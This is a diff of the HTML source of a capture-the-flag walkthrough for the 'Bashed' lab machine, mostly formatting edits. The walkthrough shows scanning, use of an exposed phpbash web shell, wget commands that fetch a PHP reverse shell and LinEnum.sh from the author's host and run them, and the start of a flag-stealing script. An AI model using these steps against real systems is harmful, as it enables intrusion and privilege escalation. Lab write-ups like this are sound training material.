@@ -71,22 +71,25 @@
 </p>
                 <p class="uk-article-lead" itemprop="description">Solution to the Bashed VM</p>
                 <section itemprop="articleBody"><h1>User flag</h1>
-<p>It is not really necessary to start this one with <em>nmap</em>, but it's never a bad first step</p>
+<p>It is not really necessary to start this one with <strong>nmap</strong>, but it's never a bad first step</p>
 <div class="highlight"><pre><span></span>root@kali:~# nmap -sS -Pn -sV <span class="m">10</span>.10.10.68
-Starting Nmap <span class="m">7</span>.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2020</span>-01-13 <span class="m">13</span>:20 CET
-Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.68
-Host is up <span class="o">(</span><span class="m">0</span>.11s latency<span class="o">)</span>.
-Not shown: <span class="m">999</span> closed ports
-PORT   STATE SERVICE VERSION
-<span class="m">80</span>/tcp open  http    Apache httpd <span class="m">2</span>.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">10</span>.24 seconds
 </pre></div>
 
 
-<p>As we can see, only port 80 is opened. After opening it in web browser, there is a unfinished, but already launched website. We can dig a bit through it, just to learn that it is connected to a <em>phpbash</em> project. That's nice, but we want to speed things up.</p>
-<p>We can run several tools to look for cool and useful, but hidden urls. My first choice here is DirBuser.
+<div class="highlight"><pre><span></span>Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-13 13:20 CET
+Nmap scan report for 10.10.10.68
+Host is up (0.11s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
+</pre></div>
+
+
+<p>As we can see, only port 80 is opened. After opening it in web browser, there is a unfinished, but already launched website. We can dig a bit through it, just to learn that it is connected to a <strong>phpbash</strong> project. That's nice, but we want to speed things up.</p>
+<p>We can run several tools to look for cool and useful, but hidden urls. My first choice here is DirBuster.
 It takes him a few minutes to find the thing we need:</p>
 <div class="highlight"><pre><span></span>http://10.10.10.68/dev/phpbash.php
 </pre></div>
@@ -101,7 +104,7 @@ $ cat /home/arrexel/user.txt
 <p>Yup, we got it!</p>
 <h1>Root flag</h1>
 <p><em>phpbash</em> is nice, but doesn't provide a full terminal experience. A reverse shell is wat we need.</p>
-<p>Firstly we need a place in the /var/www/html path to store it. Only the <em>upload</em> dir will do, but we need nothing more. Except of course of a php reverse shell with out IP in it's config. I've already got it on my Kali VM, served by an apache instance, so it's easy:</p>
+<p>Firstly we need a place in the /var/www/html path to store it. Only the <strong>upload</strong> dir will do, but we need nothing more. Except of course of a php reverse shell with out IP in it's config. I've already got it on my Kali VM, served by an apache instance, so it's easy:</p>
 <div class="highlight"><pre><span></span>www-data:/var/www/html/uploads# wget <span class="m">10</span>.10.14.16/shell.php
 </pre></div>
 
@@ -114,7 +117,7 @@ $ cat /home/arrexel/user.txt
 <p>It works, so now the same thing in <em>/tmp</em> dir <em>LinEnum</em></p>
 <div class="highlight"><pre><span></span><span class="nb">cd</span> /tmp
 wget <span class="m">10</span>.10.14.16/LinEnum.sh
-bash LinEnum.sh
+bash ./LinEnum.sh
 </pre></div>
 
 
@@ -133,8 +136,8 @@ User www-data may run the following commands on bashed:
 </pre></div>
 
 
-<p>Works. What next? We need something to find a point for privilege escalation. <em>pspy</em> will help us with it.</p>
-<div class="highlight"><pre><span></span>pspy64
+<p>Works. What next? We need something to find a point for privilege escalation. <strong>pspy</strong> will help us with it.</p>
+<div class="highlight"><pre><span></span>./pspy64
 </pre></div>
 
 
@@ -143,7 +146,7 @@ User www-data may run the following commands on bashed:
 </pre></div>
 
 
-<p>Nice, we can see, that <em>/scrips</em> dir is owned by <em>scriptmanager</em>!</p>
+<p>Nice, we can see, that <strong>/scrips</strong> dir is owned by <strong>scriptmanager</strong>!</p>
 <p>Now we need a tiny root.txt stealing python script. It doesn't need to be fancy.</p>
 <div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">shutil</span>
 <span class="kn">import</span> <span class="nn">os</span>
